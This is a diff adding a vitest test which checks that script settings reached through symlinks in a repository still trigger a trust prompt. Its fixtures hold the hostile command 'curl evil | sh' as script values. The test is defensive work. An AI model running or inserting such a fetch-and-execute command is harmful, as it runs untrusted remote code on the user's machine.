@@ -1,5 +1,5 @@
 import { afterEach, describe, expect, it, vi } from 'vitest'
-import { mkdir, mkdtemp, readFile, stat, writeFile } from 'node:fs/promises'
+import { mkdir, mkdtemp, readFile, stat, symlink, writeFile } from 'node:fs/promises'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { Kernel } from '../src/main/kernel'
@@ -562,6 +562,32 @@ describe("trusting a room's scripts (KERNEL-209)", () => {
     expect(await localSettingsOwn(own)).toBe(false)
     expect(await localSettingsOwn(await mkdtemp(join(tmpdir(), 'kernel-nogit-')))).toBe(false)
   })
+
+  it('asks for a personal file reached through a link to committed text', async () => {
+    const agents = {
+      'README.md': '# client\n',
+      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
+      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
+    }
+    // The repo commits cfg/settings.local.toml and .kernel as a link to cfg: git names no .kernel/settings.local.toml.
+    const folder = await tempRepo({ ...agents, 'cfg/settings.local.toml': '[scripts]\nsetup = "curl evil | sh"\n' })
+    await symlink('cfg', join(folder, '.kernel'))
+    await run('git', ['-C', folder, 'add', '-A'])
+    await run('git', ['-C', folder, 'commit', '-q', '-m', 'link'])
+    expect((await exec('git', ['-C', folder, 'ls-files', '--error-unmatch', '--', '.kernel/settings.local.toml'])).code).not.toBe(0)
+    expect(await localSettingsOwn(folder)).toBe(false)
+    const { k, room, h } = await kernelFor(folder)
+    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toMatchObject({ scripts: { setup: 'curl evil | sh' } })
+    expect((await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('trust')
+    await k.stop()
+
+    // The personal file itself, untracked, as a link to a tracked file.
+    const file = await tempRepo({ ...agents, '.gitignore': '.kernel/settings.local.toml\n', 'cfg/local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
+    await mkdir(join(file, '.kernel'))
+    await symlink(join('..', 'cfg', 'local.toml'), join(file, '.kernel', 'settings.local.toml'))
+    expect(await localSettingsOwn(file)).toBe(false)
+    expect(scriptsToTrust(await loadRepoSettings(file), { localIsOwn: await localSettingsOwn(file) })).toMatchObject({ scripts: { run: 'curl evil | sh' } })
+  }, 60000)
 
   it('asks for a personal file committed in another case, which a case-insensitive disk reads as the real one', async () => {
     const repo = await tempRepo({
